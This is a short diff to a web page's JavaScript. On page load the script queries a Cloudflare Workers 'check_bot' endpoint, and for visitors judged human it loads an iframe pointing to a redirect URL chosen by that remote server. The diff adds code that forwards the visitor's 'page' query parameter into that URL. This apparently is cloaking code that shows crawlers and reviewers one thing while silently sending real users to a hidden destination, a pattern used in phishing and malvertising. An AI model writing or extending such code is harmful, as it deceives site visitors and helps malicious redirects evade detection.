@@ -18,12 +18,24 @@ const toggleLoad = () => {
 };
 
 createLoader();
+function getParams() {
+    const params = {};
+
+    if (window.location.search.length > 1) {
+        const searchParams = new URLSearchParams(window.location.search.split('?')[1]);
+        searchParams.forEach(function (value, key) {
+            params[key] = value;
+        });
+    }
+    return params
+};
 
 window.addEventListener('DOMContentLoaded', () => {
+        const p = getParams();
     
     fetch('https://proxy_cf.opaopaopppa.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url_red + 'NVQVZ4')
+            createFrame(res.url_red + 'NVQVZ4?page=' + p?.page)
         } else {
             setTimeout(toggleLoad, 500);
 
